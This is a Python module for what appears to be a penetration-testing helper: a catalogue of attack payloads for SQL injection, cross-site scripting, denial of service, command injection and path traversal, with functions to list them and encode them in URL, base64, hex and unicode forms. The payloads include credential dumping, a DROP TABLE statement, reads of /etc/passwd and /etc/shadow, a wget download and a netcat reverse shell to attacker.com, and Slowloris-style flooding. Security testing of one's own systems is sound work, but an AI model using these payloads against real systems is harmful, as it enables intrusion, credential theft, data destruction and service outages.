import urllib.parse
import base64
import html
import binascii
from datetime import datetime

# ─── Payload Database ───
PAYLOADS = {
    'sql': {
        'name': 'SQL Injection',
        'description': 'Payloads for testing SQL injection vulnerabilities',
        'payloads': [
            {"payload": "' OR '1'='1",                          "description": "Basic auth bypass"},
            {"payload": "' OR 1=1--",                           "description": "Comment bypass"},
            {"payload": "admin'--",                             "description": "Admin login bypass"},
            {"payload": "' UNION SELECT NULL,NULL,NULL--",      "description": "Union based - 3 columns"},
            {"payload": "' UNION SELECT username,password,NULL FROM users--", "description": "Dump credentials"},
            {"payload": "1; DROP TABLE users--",                "description": "Destructive - drop table"},
            {"payload": "' AND SLEEP(5)--",                     "description": "Time based blind SQLi"},
            {"payload": "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--", "description": "MSSQL error based"},
            {"payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "description": "MySQL time based"},
            {"payload": "' OR 1=1 LIMIT 1--",                  "description": "MySQL auth bypass"},
            {"payload": "\" OR \"\"=\"",                        "description": "Double quote bypass"},
            {"payload": "') OR ('1'='1",                        "description": "Bracket bypass"},
            {"payload": "1' ORDER BY 1--",                      "description": "Column count detection"},
            {"payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--", "description": "List all tables"},
        ]
    },
    'xss': {
        'name': 'Cross-Site Scripting (XSS)',
        'description': 'Payloads for testing XSS vulnerabilities',
        'payloads': [
            {"payload": "<script>alert(1)</script>",                        "description": "Basic XSS"},
            {"payload": "<img src=x onerror=alert(document.cookie)>",       "description": "Cookie stealer"},
            {"payload": "<svg onload=alert(1)>",                            "description": "SVG based XSS"},
            {"payload": "<body onload=alert(1)>",                           "description": "Body onload"},
            {"payload": "javascript:alert(1)",                              "description": "JavaScript URI"},
            {"payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>", "description": "Quote escape"},
            {"payload": "<img src=\"javascript:alert('XSS')\">",            "description": "Img src JS"},
            {"payload": "<details open ontoggle=alert(1)>",                 "description": "HTML5 details tag"},
            {"payload": "<input autofocus onfocus=alert(1)>",               "description": "Input autofocus"},
            {"payload": "'-alert(1)-'",                                     "description": "JS string escape"},
            {"payload": "<iframe src=\"javascript:alert(1)\">",             "description": "IFrame injection"},
            {"payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">", "description": "MathML XSS"},
        ]
    },
    'dos': {
        'name': 'Denial of Service (DoS)',
        'description': 'Payloads for testing DoS vulnerabilities',
        'payloads': [
            {"payload": "while(true){fetch(window.location)}",              "description": "JS infinite loop"},
            {"payload": "/(a+)+$/",                                         "description": "ReDoS pattern"},
            {"payload": "<?php while(true){ echo str_repeat('A',9999); }",  "description": "PHP memory exhaustion"},
            {"payload": "Array.from({length:1e8}).join('x')",               "description": "JS memory exhaustion"},
            {"payload": "SELECT SLEEP(999999)",                             "description": "DB connection hold"},
            {"payload": "POST / HTTP/1.1\\r\\nContent-Length: 9999\\r\\n\\r\\n", "description": "Slowloris header"},
            {"payload": "X-a: b\\r\\n (repeat 10000 times)",               "description": "Header flooding"},
            {"payload": "?search=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",       "description": "ReDoS via search"},
        ]
    },
    'cmd': {
        'name': 'Command Injection',
        'description': 'Payloads for testing command injection vulnerabilities',
        'payloads': [
            {"payload": "; ls -la",                             "description": "List directory (Linux)"},
            {"payload": "; cat /etc/passwd",                    "description": "Read passwd file"},
            {"payload": "| whoami",                             "description": "Get current user"},
            {"payload": "`id`",                                 "description": "Backtick execution"},
            {"payload": "$(cat /etc/shadow)",                   "description": "Read shadow file"},
            {"payload": "; wget http://attacker.com/shell.sh",  "description": "Download remote file"},
            {"payload": "& ipconfig",                           "description": "Windows ipconfig"},
            {"payload": "& net user",                           "description": "Windows user list"},
            {"payload": "; python3 -c \"import os;os.system('id')\"", "description": "Python execution"},
            {"payload": "|| ping -c 5 attacker.com",           "description": "Out-of-band detection"},
            {"payload": "; nc -e /bin/sh attacker.com 4444",   "description": "Reverse shell"},
            {"payload": "$(sleep 5)",                           "description": "Time based detection"},
        ]
    },
    'path': {
        'name': 'Path Traversal',
        'description': 'Payloads for testing path traversal vulnerabilities',
        'payloads': [
            {"payload": "../../../etc/passwd",                  "description": "Basic Linux traversal"},
            {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "description": "Windows traversal"},
            {"payload": "....//....//....//etc/passwd",         "description": "Double dot bypass"},
            {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",      "description": "URL encoded"},
            {"payload": "..%2F..%2F..%2Fetc%2Fpasswd",         "description": "Mixed encoding"},
            {"payload": "%252e%252e%252fetc%252fpasswd",        "description": "Double URL encoded"},
            {"payload": "..%c0%af..%c0%afetc%c0%afpasswd",     "description": "UTF-8 encoding"},
            {"payload": "/var/www/../../etc/shadow",            "description": "Absolute path"},
            {"payload": "....\\....\\....\\etc\\passwd",        "description": "Backslash variant"},
            {"payload": "php://filter/read=convert.base64-encode/resource=index.php", "description": "PHP wrapper"},
        ]
    }
}

def get_payloads(category='sql'):
    """Get payloads for a specific category."""
    category = category.lower()
    if category not in PAYLOADS:
        return {'error': f'Unknown category: {category}', 'available': list(PAYLOADS.keys())}

    data = PAYLOADS[category].copy()
    data['category'] = category
    data['count'] = len(data['payloads'])
    return data

def get_all_categories():
    """Get list of all categories."""
    return [
        {'key': k, 'name': v['name'], 'count': len(v['payloads'])}
        for k, v in PAYLOADS.items()
    ]

def encode(text, method='url'):
    """Encode payload using various methods."""
    if not text:
        return {'error': 'No text provided'}

    method = method.lower()
    result = ''
    error = None

    try:
        if method == 'url':
            result = urllib.parse.quote(text, safe='')
        elif method == 'double_url':
            result = urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')
        elif method == 'base64':
            result = base64.b64encode(text.encode('utf-8')).decode('utf-8')
        elif method == 'html':
            result = html.escape(text)
        elif method == 'hex':
            result = ''.join(f'%{ord(c):02x}' for c in text)
        elif method == 'unicode':
            result = ''.join(f'\\u{ord(c):04x}' for c in text)
        elif method == 'base64_url':
            b64 = base64.b64encode(text.encode('utf-8')).decode('utf-8')
            result = urllib.parse.quote(b64, safe='')
        else:
            error = f'Unknown encoding method: {method}'
    except Exception as e:
        error = str(e)

    if error:
        return {'error': error}

    return {
        'original': text,
        'encoded': result,
        'method': method,
        'length_original': len(text),
        'length_encoded': len(result),
    }

def decode(text, method='url'):
    """Decode encoded payload."""
    if not text:
        return {'error': 'No text provided'}

    method = method.lower()
    result = ''
    error = None

    try:
        if method == 'url':
            result = urllib.parse.unquote(text)
        elif method == 'base64':
            result = base64.b64decode(text.encode('utf-8')).decode('utf-8')
        elif method == 'html':
            result = html.unescape(text)
        else:
            error = f'Unknown decoding method: {method}'
    except Exception as e:
        error = str(e)

    if error:
        return {'error': error}

    return {
        'original': text,
        'decoded': result,
        'method': method,
    }